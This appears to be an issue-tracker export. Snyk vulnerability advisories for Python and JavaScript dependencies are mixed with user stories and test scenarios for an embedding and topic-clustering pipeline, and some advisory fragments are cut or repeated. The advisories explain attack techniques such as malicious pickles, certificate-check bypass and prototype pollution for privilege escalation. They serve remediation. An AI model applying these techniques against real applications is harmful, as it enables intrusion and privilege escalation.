## Remote Code Execution (RCE)

**Severity:** high
**Package:** nltk@3.8.1
**File:** `score-processor-lambda/requirements.txt`

**CVSS Score:** 8.4  
**Snyk Priority Score:** 634/1000

### CVEs
- [CVE-2024-39705](https://nvd.nist.gov/vuln/detail/CVE-2024-39705)

**Fix:** Pin `nltk` to version 3.9 or later.

### Details
## Overview
[nltk](http://www.nltk.org) is a Natural Language Toolkit (NLTK) is a Python package for natural language processing.

Affected versions of this package are vulnerable to Remote Code Execution (RCE) through the integrated data package download functionality. An attacker with control over the [NLTK data index](https://github.com/nltk/nltk_data) can execute arbitrary code by supplying pickled Python code within untrusted packages and trick a user into loading the malicious pickle.

Some packages found to be vulnerable if compromised are `averaged_perceptron_tagger`, `punkt`, `maxent_ne_chunker`, `help/tagsets`, and `maxent_treebank_pos_tagger`.
## Remediation
Upgrade `nltk` to version 3.9 or higher.
## References
- [GitHub Commit](https://github.com/nltk/nltk/commit/a12d0a6a8cdba58d5e4e5f92ac62bb80fc26c624)
- [GitHub Issue](https://github.com/nltk/nltk/issues/2522)
- [GitHub Issue](https://github.com/nltk/nltk/issues/3266)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-PYTHON-NLTK-7411380)
issues.title: [Snyk] SNYK-PYTHON-NLTK-7411380 in nltk@3.8.1

## Always-Incorrect Control Flow Implementation

**Severity:** medium
**Package:** requests@2.31.0
**File:** `infrastructure/lambda_functions/metrics_aggregator/requirements.txt`

**CVSS Score:** 5.6  
**Snyk Priority Score:** 494/1000

### CVEs
- [CVE-2024-35195](https://nvd.nist.gov/vuln/detail/CVE-2024-35195)

**Fix:** Pin `requests` to version 2.32.2 or later.

### Details
## Overview

Affected versions of this package are vulnerable to Always-Incorrect Control Flow Implementation when making requests through a Requests `Session`. An attacker can bypass certificate verification by making the first request with `verify=False`, causing all subsequent requests to ignore certificate verification regardless of changes to the `verify` value.

**Notes:**

1) For requests <2.32.0, avoid setting `verify=False` for the first request to a host while using a Requests Session.

2) For requests <2.32.0, call `close()` on Session objects to clear existing connections if `verify=False` is used.

3) This vulnerability was initially fixed in version [2.32.0](https://pypi.org/project/requests/2.32.0/), which was yanked. Therefore, the next available fixed version is 2.32.2.
## Remediation
Upgrade `requests` to version 2.32.2 or higher.
## References
- [GitHub Commit](https://github.com/psf/requests/commit/a58d7f2ffb4d00b46dca2d70a3932a0b37e22fac)
- [GitHub PR](https://github.com/psf/requests/pull/6655)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-PYTHON-REQUESTS-6928867)
issues.title: [Snyk] SNYK-PYTHON-REQUESTS-6928867 in requests@2.31.0

## Improper Handling of Highly Compressed Data (Data Amplification)

**Severity:** high
**Package:** urllib3@2.0.7
**File:** `infrastructure/lambda_functions/metrics_aggregator/requirements.txt`

**CVSS Score:** 8.9  
**Snyk Priority Score:** 659/1000

### CVEs
- [CVE-2026-21441](https://nvd.nist.gov/vuln/detail/CVE-2026-21441)

**Fix:** Pin `urllib3` to version 2.6.3 or later.

### Details
## Overview
[urllib3](https://pypi.org/project/urllib3/) is a HTTP library with thread-safe connection pooling, file post, and more.

Affected versions of this package are vulnerable to Improper Handling of Highly Compressed Data (Data Amplification) via the streaming API when handling HTTP redirects. An attacker can cause excessive resource consumption by serving a specially crafted compressed response that triggers decompression of large amounts of data before any read limits are enforced.

**Note:**
This is only exploitable if content is streamed from untrusted sources with redirects enabled.

## Workaround 
This vulnerability can be mitigated by disabling redirects by setting `redirect=False` for requests to untrusted sources.
## Remediation
Upgrade `urllib3` to version 2.6.3 or higher.
## References
- [GitHub Commit](https://github.com/urllib3/urllib3/commit/8864ac407bba8607950025e0979c4c69bc7abc7b)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-PYTHON-URLLIB3-14896210)
issues.title: [Snyk] SNYK-PYTHON-URLLIB3-14896210 in urllib3@2.0.7

## Use of Cache Containing Sensitive Information

**Severity:** medium
**Package:** next@14.2.29
**File:** `dashboard/package.json`

**CVSS Score:** 6.3  
**Snyk Priority Score:** 529/1000

### CVEs
- [CVE-2025-57752](https://nvd.nist.gov/vuln/detail/CVE-2025-57752)

**Fix:** Upgrade `next` to version 14.2.31, 15.4.2-canary.19, 15.4.5 or later.

### Details
## Overview
[next](https://www.npmjs.com/package/next) is a react framework.

Affected versions of this package are vulnerable to Use of Cache Containing Sensitive Information in the image optimization process, when responses from API routes vary based on request headers such as `Cookie` or `Authorization`. An attacker can gain unauthorized access to sensitive image data by exploiting cache key confusion, causing responses intended for authenticated users to be served to unauthorized users.

**Note:** Exploitation requires a prior authorized request to populate the cache.
## Remediation
Upgrade `next` to version 14.2.31, 15.4.2-canary.19, 15.4.5 or higher.
## References
- [GitHub Commit](https://github.com/vercel/next.js/commit/6b12c60c61ee80cb0443ccd20de82ca9b4422ddd)

## Improper Handling of Highly Compressed Data (Data Amplification)

**Severity:** high
**Package:** urllib3@1.26.20
**File:** `score-processor-fanout-lambda/requirements.txt`

**CVSS Score:** 8.9  
**Snyk Priority Score:** 659/1000

### CVEs
- [CVE-2025-66471](https://nvd.nist.gov/vuln/detail/CVE-2025-66471)

**Fix:** Pin `urllib3` to version 2.6.0 or later.

### Details
## Overview
[urllib3](https://pypi.org/project/urllib3/) is a HTTP library with thread-safe connection pooling, file post, and more.

Affected versions of this package are vulnerable to Improper Handling of Highly Compressed Data (Data Amplification) in the Streaming API. The `ContentDecoder` class can be forced to allocate disproportionate resources when processing a single chunk with very high compression, such as via the `stream()`, `read(amt=256)`, `read1(amt=256)`, `read_chunked(amt=256)`, and `readinto(b)` functions.

**Note:** It is recommended to patch Brotli dependencies (upgrade to at least 1.2.0) if they are installed outside of `urllib3` as well, to avoid other instances of the same vulnerability.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](https://security.snyk.io/vuln/SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `urllib3` to version 2.6.0 or higher.
## References
- [GitHub Commit](https://github.com/urllib3/urllib3/commit/c19571de34c47de3a766541b041637ba5f716ed7)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-PYTHON-URLLIB3-14192442)
issues.title: [Snyk] SNYK-PYTHON-URLLIB3-14192442 in urllib3@1.26.20

### Details
## NVD Description
**_Note:_** _Versions mentioned in the description apply only to the upstream `shadow` package and not the `shadow` package as distributed by `Debian`._
_See `How to fix?` for `Debian:13` relevant fixed versions and status._

shadow-utils (aka shadow) 4.4 through 4.17.0 establishes a default /etc/subuid behavior (e.g., uid 100000 through 165535 for the first user account) that can realistically conflict with the uids of users defined on locally administered networks, potentially leading to account takeover, e.g., by leveraging newuidmap for access to an NFS home directory (or same-host resources in the case of remote logins by these local network users). NOTE: it may also be argued that system administrators should not have assigned uids, within local networks, that are within the range that can occur in /etc/subuid.
## Remediation
There is no fixed version for `Debian:13` `shadow`.

## Prototype Pollution **Severity:** medium **Package:** js-yaml@4.1.0 **File:** `dashboard/package.json` **CVSS Score:** 6.9 **Snyk Priority Score:** 559/1000 ### CVEs - [CVE-2025-64718](https://nvd.nist.gov/vuln/detail/CVE-2025-64718) **Fix:** Upgrade `js-yaml` to version 3.14.2, 4.1.1 or later. ### Details ## Overview [js-yaml](https://www.npmjs.com/package/js-yaml) is a human-friendly data serialization language. Affected versions of this package are vulnerable to Prototype Pollution via the `merge` function. An attacker can alter object prototypes by supplying specially crafted YAML documents containing `__proto__` properties. This can lead to unexpected behavior or security issues in applications that process untrusted YAML input. ## Workaround This vulnerability can be mitigated by running the server with `node --disable-proto=delete` or by using Deno, which has pollution protection enabled by default. ## Details Prototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values. Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution. There are two main ways in which the pollution of prototypes occurs: - Unsafe `Object` recursive merge - Property definition by path ### Unsafe Object recursive merge The logic of a vulnerable recursive merge function follows the following high-level model: ``` merge (target, source) foreach property of source if property exists and is an object on both the target and the source merge(target[property], source[property]) else target[property] = source[property] ```
When the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype. Clone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`. `lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks. ### Property definition by path There are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)` If the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object. ## Types of attacks There are a few methods by which Prototype Pollution can be manipulated: | Type |Origin |Short description | |--|--|--| | **Denial of service (DoS)**|Client |This is the most likely attack.
DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`).
The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.
**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. | |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.
**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.| |**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.
**For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.| ## Affected environments The following environments are susceptible to a Prototype Pollution attack: - Application server - Web server - Web browser ## How to prevent 1. Freeze the prototype— use `Object.freeze (Object.prototype)`. 2. Require schema validation of JSON input. 3. Avoid using unsafe recursive merge functions. 4. Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution. 5. As a best practice use `Map` instead of `Object`. ### For more information on this vulnerability type: [Arteau, Olivier. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf) ## Remediation Upgrade `js-yaml` to version 3.14.2, 4.1.1 or higher. ## References - [GitHub Commit](https://github.com/nodeca/js-yaml/commit/383665ff4248ec2192d1274e934462bb30426879) - [GitHub Commit](https://github.com/nodeca/js-yaml/commit/5278870a17454fe8621dbd8c445c412529525266) ### Reference - [Snyk advisory](https://security.snyk.io/vuln/SNYK-JS-JSYAML-13961110)
issues.title: [Snyk] SNYK-JS-JSYAML-13961110 in js-yaml@4.1.0

## Open Redirect

**Severity:** medium
**Package:** urllib3@1.26.20
**File:** `score-processor-fanout-lambda/requirements.txt`

**CVSS Score:** 6.0  
**Snyk Priority Score:** 514/1000

### CVEs
- [CVE-2025-50181](https://nvd.nist.gov/vuln/detail/CVE-2025-50181)

**Fix:** Pin `urllib3` to version 2.5.0 or later.

### Details
## Overview
[urllib3](https://pypi.org/project/urllib3/) is a HTTP library with thread-safe connection pooling, file post, and more.

Affected versions of this package are vulnerable to Open Redirect due to the `retries` parameter being ignored during `PoolManager` instantiation. An attacker can access unintended resources or endpoints by leveraging automatic redirects when the application expects redirects to be disabled at the connection pool level.

**Note:**

`requests` and `botocore` users are not affected.

## Workaround

This can be mitigated by disabling redirects at the `request()` level instead of the `PoolManager()` level.
## Remediation
Upgrade `urllib3` to version 2.5.0 or higher.
## References
- [GitHub Commit](https://github.com/urllib3/urllib3/commit/f05b1329126d5be6de501f9d1e3e36738bc08857)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-PYTHON-URLLIB3-10390194)

Feature: Dataset resolution and embedding pipeline integration

  Scenario: Dataset resolved and embeddings computed
    Given a VectorTopicMemory block with config data.source = "test-source"
    And DatasetResolver is mocked to return a DataFrame with 100 rows and a "text" column
    And EmbeddingService is mocked to return 100 embeddings
    When generate() is awaited
    Then DatasetResolver.resolve_and_cache_dataset is called with source="test-source"
    And EmbeddingService.batch_embed is called with 100 text strings
    And the output dictionary contains "items_processed": 100

  Scenario: Custom content column is used
    Given config data.content_column = "transcript"
    And the resolved DataFrame has a "transcript" column
    When generate() is awaited
    Then EmbeddingService.batch_embed receives texts from the "transcript" column

  Scenario: Dataset resolution failure produces clean error
    Given DatasetResolver returns (None, None)
    When generate() is awaited
    Then the output contains an error about dataset resolution
    And no embedding computation is attempted

issues.description:
**As a** VectorTopicMemory block, **I want** to resolve the dataset via `DatasetResolver` and produce cached embeddings, **so that** re-indexing does not mean re-embedding.

This story replaces the shell from Story plx-30a738 with real data flow. It wires up:
- `DatasetResolver` from `plexus/reports/blocks/data_utils.py` to load the dataset
- `EmbeddingService` from Epic 2 to compute embeddings with S3 caching

OpenSearch and clustering are still mocked at this stage. The block extracts text from a configurable column (`data.content_column`, defaulting to `text`) and feeds it to the embedding pipeline.

## Key Files

- Modify: `plexus/reports/blocks/vector_topic_memory.py`
- Modify: `plexus/reports/blocks/vector_topic_memory_test.py`

## Dependencies

- Story plx-30a738 (Generate returns structured output envelope)
- Story plx-3bb9ce (Batch embedding with cache-aware pipeline)

## Always-Incorrect Control Flow Implementation

**Severity:** medium
**Package:** requests@2.31.0
**File:** `score-processor-lambda/requirements.txt`

**CVSS Score:** 5.6  
**Snyk Priority Score:** 494/1000

### CVEs
- [CVE-2024-35195](https://nvd.nist.gov/vuln/detail/CVE-2024-35195)

**Fix:** Pin `requests` to version 2.32.2 or later.

### Details
## Overview

Affected versions of this package are vulnerable to Always-Incorrect Control Flow Implementation when making requests through a Requests `Session`. An attacker can bypass certificate verification by making the first request with `verify=False`, causing all subsequent requests to ignore certificate verification regardless of changes to the `verify` value.

**Notes:**

1) For requests <2.32.0, avoid setting `verify=False` for the first request to a host while using a Requests Session.

2) For requests <2.32.0, call `close()` on Session objects to clear existing connections if `verify=False` is used.

3) This vulnerability was initially fixed in version [2.32.0](https://pypi.org/project/requests/2.32.0/), which was yanked. Therefore, the next available fixed version is 2.32.2.
## Remediation
Upgrade `requests` to version 2.32.2 or higher.
## References
- [GitHub Commit](https://github.com/psf/requests/commit/a58d7f2ffb4d00b46dca2d70a3932a0b37e22fac)
- [GitHub PR](https://github.com/psf/requests/pull/6655)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-PYTHON-REQUESTS-6928867)
issues.title: [Snyk] SNYK-PYTHON-REQUESTS-6928867 in requests@2.31.0

comments.author: ryan.porter
comments.text:
Feature: Memory weight update integrated with cluster records

  Scenario: Full update cycle reinforces active clusters and decays inactive ones
    Given 5 existing cluster records with weights [0.5, 0.7, 0.3, 0.8, 0.4]
    And the current run matched new documents to clusters [0, 1, 3]
    When update_memory_weights(existing_clusters, active_cluster_ids=[0, 1, 3]) is called
    Then clusters 0, 1, 3 have weights higher than before
    And clusters 2, 4 have weights lower than before
    And all cluster records have updated memory_tier values

  Scenario: Weight updates are persisted to OpenSearch
    Given updated cluster weights
    When persist is called
    Then OpenSearch bulk update is invoked for each cluster record
    And each update sets the new memory_weight and memory_tier fields

  Scenario: Pruned clusters are removed from the index
    Given cluster 4 has weight below prune_threshold
    When update_memory_weights is called with prune=True
    Then cluster 4's record is deleted from OpenSearch
    And items previously in cluster 4 have cluster_id set to -1

issues.description:
**As a** topic memory system, **I want** to apply weight updates to persisted cluster records after each run, **so that** memory state is durable across runs.

After global clustering runs, the system computes which clusters were reinforced (matched new documents) and which were not (decayed). Updated weights and tiers are written back to the cluster records in OpenSearch via bulk update.

Pruned clusters (weight below threshold) are deleted from OpenSearch, and their previously-assigned items have `cluster_id` set to -1 (unassigned) to be reassigned on the next run.

## Key Files

- Modify: `plexus/analysis/memory_weights.py`
- Modify: `plexus/analysis/memory_weights_test.py`
- Modify: `plexus/analysis/opensearch_client.py` (add bulk update method for cluster records)

## Dependencies

- Story plx-9984cc (Memory weight calculation)
- Story plx-5244af (Cluster record persistence in OpenSearch)
issues.title: Memory weight update integrated with cluster records

issues.description:
## Insufficient Verification of Data Authenticity

**Severity:** high
**Package:** cryptography@45.0.7
**File:** `score-processor-lambda/requirements.txt`

**CVSS Score:** 8.9  
**Snyk Priority Score:** 731/1000

### CVEs
- [CVE-2026-26007](https://nvd.nist.gov/vuln/detail/CVE-2026-26007)

**Fix:** Pin `cryptography` to version 46.0.5 or later.

### Details
## Overview

Affected versions of this package are vulnerable to Insufficient Verification of Data Authenticity in public key functions `public_key_from_numbers`, `EllipticCurvePublicNumbers.public_key`, `load_der_public_key`, and `load_pem_public_key`, which may reveal bits from a private key when provided with a malicious public key as input. When the application is using `sect*` binary curves for verification - which is a rare use case - these functions do not verify that the provided point belongs to the expected prime-order subgroup of the curve. An attacker can thus expose partial private keys or forge signatures.
## Remediation
Upgrade `cryptography` to version 46.0.5 or higher.
## References
- [GitHub Commit](https://github.com/pyca/cryptography/commit/0eebb9dbb6343d9bc1d91e5a2482ed4e054a6d8c)
- [GitHub Release](https://github.com/pyca/cryptography/releases/tag/46.0.5)


### Reference
- [Snyk advisory](https://security.snyk.io/vuln/SNYK-PYTHON-CRYPTOGRAPHY-15263096)
issues.title: [Snyk] SNYK-PYTHON-CRYPTOGRAPHY-15263096 in cryptography@45.0.7

comments.author: ryan.porter
comments.text:
Feature: S3 read/write for cached embeddings

  Scenario: Cache miss returns None
    Given an S3 bucket "plexus-embeddings" exists but is empty
    And an EmbeddingCache instance configured with that bucket
    When get(cache_key) is called for a key that does not exist
    Then the return value is None

  Scenario: Round-trip write then read preserves vector
    Given an EmbeddingCache instance with a mocked S3 client
    And a numpy array embedding of 384 dimensions
    When put(cache_key, embedding) is called
    And then get(cache_key) is called
    Then the returned vector equals the original within floating-point tolerance
    And the S3 key follows the pattern "embeddings/{model_id}/{first_2_chars}/{full_key}.json"

  Scenario: S3 read error returns None gracefully
    Given an EmbeddingCache instance where S3 raises a ClientError on get_object
    When get(cache_key) is called
    Then it returns None
    And a warning is logged

  Scenario: S3 write error is non-fatal
    Given an EmbeddingCache instance where S3 raises a ClientError on put_object
    When put(cache_key, embedding) is called
    Then no exception is raised
    And an error is logged

issues.description:
**As an** embedding pipeline, **I want** to store and retrieve embedding vectors from S3, **so that** expensive model invocations are avoided on re-runs.

Embedding vectors (as numpy arrays serialized to JSON) are stored in S3 at the path `embeddings/{model_id}/{key_prefix}/{key}.json`, where `key_prefix` is the first two hex characters of the cache key for S3 prefix-based partitioning. Follows the same boto3 patterns used in `plexus/reports/s3_utils.py`.

Error handling is crucial: S3 read failures must return `None` (cache miss) rather than crashing the pipeline. S3 write failures must be non-fatal (log and continue) since the embedding was already computed in memory.

## Key Files

- Modify: `plexus/analysis/embedding_cache.py`
- Modify: `plexus/analysis/embedding_cache_test.py`

## Dependencies

Story plx-19f3d6 (Deterministic cache key generation)
issues.title: S3 read/write for cached embeddings

issues.description:
## Deserialization of Untrusted Data

**Severity:** high
**Package:** next@14.2.29
**File:** `dashboard/package.json`

**CVSS Score:** 8.7  
**Exploit Maturity:** proof-of-concept  
**Snyk Priority Score:** 796/1000

### CVEs
- [CVE-2025-55184](https://nvd.nist.gov/vuln/detail/CVE-2025-55184)

**Fix:** Upgrade `next` to version 14.2.34, 15.0.6, 15.1.10, 15.2.7, 15.3.7, 15.4.9, 15.5.8, 16.0.9, 16.1.0-canary.19 or later.

### Details
## Overview
[next](https://www.npmjs.com/package/next) is a react framework.

Affected versions of this package are vulnerable to Deserialization of Untrusted Data due to unsafe deserialization of payloads from HTTP requests to Server Function endpoints. An attacker can cause the server process to enter an infinite loop and hang, preventing it from serving future HTTP requests by sending specially crafted payloads.

**Notes:**

Even if your app does not implement any React Server Function endpoints it may still be vulnerable if your app supports React Server Components.

If your app’s React code does not use a server, your app is not affected by these vulnerabilities. If your app does not use a framework, bundler, or bundler plugin that supports React Server Components, your app is not affected by these vulnerabilities.

For React Native users not using a monorepo or `react-dom`, your `react` version should be pinned in your `package.json`, and there are no additional steps needed.

If you are using React Native in a monorepo, you should update only the impacted packages if they are installed: `react-server-dom-webpack`, `react-server-dom-parcel`, `react-server-dom-turbopack`. This is required to mitigate the security advisories, but you do not need to update `react` and `react-dom` so this will not cause the version mismatch error in React Native. See [this issue](https://github.com/facebook/react-native/issues/54772#issuecomment-3617929832) for more information.

## Details

Serialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.

_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, thus allowing the attacker to control the state or the flow of the execution.
  
## Remediation
Upgrade `next` to version 14.2.34, 15.0.6, 15.1.10, 15.2.7, 15.3.7, 15.4.9, 15.5.8, 16.0.9, 16.1.0-canary.19 or higher.

**Severity:** low
**Package:** numpy@1.21.3

- [CVE-2021-41495](https://nvd.nist.gov/vuln/detail/CVE-2021-41495)

**Fix:** Pin `numpy` to version 1.22.2 or later.

### Details
## Overview
[numpy](https://github.com/numpy/numpy) is a fundamental package needed for scientific computing with Python.

Affected versions of this package are vulnerable to NULL Pointer Dereference due to missing return-value validation in the `PyArray_DescrNew` function, which may allow attackers to conduct Denial of Service attacks by repetitively creating and sort arrays.

**Note:** This may likely only happen if application memory is already exhausted, as it requires the `newdescr` object of the `PyArray_DescrNew` to evaluate to `NULL`.
## Remediation
Upgrade `numpy` to version 1.22.2 or higher.

## Infinite loop

**Severity:** medium
**Package:** zipp@3.15.0
**File:** `infrastructure/requirements.txt`

**CVSS Score:** 6.9  
**Exploit Maturity:** proof-of-concept  
**Snyk Priority Score:** 666/1000

### CVEs
- [CVE-2024-5569](https://nvd.nist.gov/vuln/detail/CVE-2024-5569)

**Fix:** Pin `zipp` to version 3.19.1 or later.

### Details
## Overview

Affected versions of this package are vulnerable to Infinite loop where an attacker can cause the application to stop responding by initiating a loop through functions affecting the `Path` module, such as `joinpath`, the overloaded division operator, and `iterdir`.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](https://security.snyk.io/vuln/SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `zipp` to version 3.19.1 or higher.
## References
- [GitHub Commit](https://github.com/jaraco/zipp/commit/fd604bd34f0343472521a36da1fbd22e793e14fd)
- [GitHub Issue](https://github.com/jaraco/zipp/issues/119)

## Improper Handling of Highly Compressed Data (Data Amplification)

**Severity:** high
**Package:** urllib3@1.26.20
**File:** `dashboard/amplify/functions/taskDispatcher/requirements.txt`

**CVSS Score:** 8.9  
**Snyk Priority Score:** 659/1000

### CVEs
- [CVE-2026-21441](https://nvd.nist.gov/vuln/detail/CVE-2026-21441)

**Fix:** Pin `urllib3` to version 2.6.3 or later.

### Details
## Overview
[urllib3](https://pypi.org/project/urllib3/) is a HTTP library with thread-safe connection pooling, file post, and more.

Affected versions of this package are vulnerable to Improper Handling of Highly Compressed Data (Data Amplification) via the streaming API when handling HTTP redirects. An attacker can cause excessive resource consumption by serving a specially crafted compressed response that triggers decompression of large amounts of data before any read limits are enforced.

**Note:**
This is only exploitable if content is streamed from untrusted sources with redirects enabled.

## Workaround 
This vulnerability can be mitigated by disabling redirects by setting `redirect=False` for requests to untrusted sources.
## Remediation
Upgrade `urllib3` to version 2.6.3 or higher.
## References
- [GitHub Commit](https://github.com/urllib3/urllib3/commit/8864ac407bba8607950025e0979c4c69bc7abc7b)

## CVE-2026-0861

**Severity:** low
**Package:** glibc/libc-bin@2.41-12+deb13u1
**File:** `score-processor-lambda/Dockerfile`

**Snyk Priority Score:** 150/1000

### CVEs
- [CVE-2026-0861](https://nvd.nist.gov/vuln/detail/CVE-2026-0861)

**Fix:** No automatic fix available. Review manually.

### Details
## NVD Description
**_Note:_** _Versions mentioned in the description apply only to the upstream `glibc` package and not the `glibc` package as distributed by `Debian`._
_See `How to fix?` for `Debian:13` relevant fixed versions and status._

Passing too large an alignment to the memalign suite of functions (memalign, posix_memalign, aligned_alloc) in the GNU C Library version 2.30 to 2.42 may result in an integer overflow, which could consequently result in a heap corruption.

Note that the attacker must have control over both, the size as well as the alignment arguments of the memalign function to be able to exploit this.  The size parameter must be close enough to PTRDIFF_MAX so as to overflow size_t along with the large alignment argument.  This limits the malicious inputs for the alignment for memalign to the range [1<<62+ 1, 1<<63] and exactly 1<<63 for posix_memalign and aligned_alloc.

Typically the alignment argument passed to such functions is a known constrained quantity (e.g. page size, block size, struct sizes) and is not attacker controlled, because of which this may not be easily exploitable in practice.  An application bug could potentially result in the input alignment being too large, e.g. due to a different buffer overflow or integer overflow in the application or its dependent libraries, but that is again an uncommon usage pattern given typical sources of alignments.
## Remediation
There is no fixed version for `Debian:13` `glibc`.
## References
- [https://security-tracker.debian.org/tracker/CVE-2026-0861](https://security-tracker.debian.org/tracker/CVE-2026-0861)

### Details
## Overview
[urllib3](https://pypi.org/project/urllib3/) is a HTTP library with thread-safe connection pooling, file post, and more.

Affected versions of this package are vulnerable to Improper Handling of Highly Compressed Data (Data Amplification) in the Streaming API. The `ContentDecoder` class can be forced to allocate disproportionate resources when processing a single chunk with very high compression, such as via the `stream()`, `read(amt=256)`, `read1(amt=256)`, `read_chunked(amt=256)`, and `readinto(b)` functions.

**Note:** It is recommended to patch Brotli dependencies (upgrade to at least 1.2.0) if they are installed outside of `urllib3` as well, to avoid other instances of the same vulnerability.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation

comments.author: ryan.porter
comments.text:
Feature: Cluster from pre-computed embeddings

  Scenario: Clustering assigns cluster IDs to all documents
    Given 500 pre-computed embeddings of 384 dimensions each
    And their corresponding text documents
    When cluster(embeddings, documents, min_topic_size=10) is called
    Then each document receives a cluster_id (integer, -1 for outliers)
    And there are at least 2 non-outlier clusters
    And a cluster_version string is returned (timestamp-based)

  Scenario: Clustering computes centroid for each cluster
    Given clustering results with 5 non-outlier clusters
    When cluster_centroids() is called
    Then 5 centroid vectors are returned, each 384 dimensions
    And each centroid is the mean of its member embeddings

  Scenario: Clustering computes p95 distance for each cluster
    Given clustering results with 5 non-outlier clusters
    When cluster_boundaries() is called
    Then 5 p95_distance values are returned
    And each p95_distance is the 95th percentile of cosine distances from members to centroid

  Scenario: Clustering generates labels via LLM
    Given clustering results with representative documents per cluster
    And a mocked LLM that returns descriptive labels
    When generate_labels(clusters) is called
    Then each cluster has a human-readable label string
    And the LLM is called once per non-outlier cluster

issues.description:
**As a** topic memory system, **I want** to cluster pre-computed embedding vectors via BERTopic (UMAP + HDBSCAN + c-TF-IDF), **so that** the embedding step is decoupled from the clustering step.

The existing `plexus/analysis/topics/analyzer.py` passes raw text to BERTopic which embeds internally. This `TopicClusterer` accepts pre-computed vectors instead, following the same UMAP/HDBSCAN config patterns (UMAP: `n_components=5, min_dist=0.0, metric=cosine`; HDBSCAN via BERTopic's `min_topic_size`).

After clustering, the system computes:
- **Centroids**: mean of member embeddings per cluster
- **p95 distances**: 95th percentile of cosine distances from members to centroid (for threshold-based assignment)
- **Labels**: human-readable topic labels via LLM (configurable provider, mocked in tests)

